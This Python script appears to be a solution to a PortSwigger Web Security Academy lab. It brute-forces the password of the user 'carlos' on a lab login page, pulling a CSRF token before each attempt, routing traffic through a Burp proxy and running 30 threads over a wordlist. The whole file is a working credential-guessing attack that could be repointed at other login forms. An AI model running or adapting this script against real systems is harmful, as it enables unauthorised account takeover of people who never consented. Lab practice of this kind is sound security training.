from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from bs4 import BeautifulSoup

ca_cert_path = "certs/burp_cacert_chain.pem"
base_url = "https://0ae50054038243b080438079007600fa.web-security-academy.net"
endpoints = ["/login", "/login2"]
username = "carlos"
session_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
password_found = None  # Shared result placeholder


def load_password_list():
    try:
        with open("res/passwords.txt", "r") as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print("Password file not found.")
        return []


def get_csrf_token(response):
    """Retrieve CSRF token from the specified URL."""
    try:
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "csrf"})
        if csrf_token is None or "value" not in csrf_token.attrs:
            return None
        return csrf_token["value"]
    except Exception:
        return None


def try_password(password):
    """Attempt to log in with the given password."""
    global password_found

    if password_found:
        return None  # Stop further attempts if a password has been found

    session = requests.Session()
    session.headers.update(session_headers)
    session.proxies.update(proxies)

    try:
        # Step 1: Get the CSRF token
        response = session.get(f"{base_url}{endpoints[0]}", verify=ca_cert_path, timeout=10)
        response.raise_for_status()
        csrf_token = get_csrf_token(response)
        if not csrf_token:
            return None  # Skip if no CSRF token is retrieved

        # Step 2: Try the password
        payload = {"csrf": csrf_token, "username": username, "password": password}
        response = session.post(f"{base_url}{endpoints[0]}", data=payload, verify=ca_cert_path, allow_redirects=False, timeout=10)

        if response.status_code == 302:  # Success (redirect to authenticated page)
            password_found = password
            print(f"Password found: {password}")
            return password
        else:
            print(f"Trying password: {password}")
    except requests.exceptions.Timeout:
        print(f"Timeout occurred for password: {password}. Skipping...")
    except requests.exceptions.RequestException as e:
        print(f"Request error occurred for password: {password}. Error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred for password {password}: {e}")
    finally:
        session.close()

    return None


def main():
    global password_found

    passwords = load_password_list()
    if not passwords:
        print("No passwords to test. Exiting.")
        return

    with ThreadPoolExecutor(max_workers=30) as executor:
        # Submit all password attempts to the pool
        future_to_password = {executor.submit(try_password, password): password for password in passwords}

        for future in as_completed(future_to_password):
            result = future.result()
            if result:
                password_found = result
                print(f"Brute-force successful: {password_found}")
                break  # Stop processing once a password is found

    if not password_found:
        print("Password not found. Brute-force attempt unsuccessful.")


if __name__ == "__main__":
    main()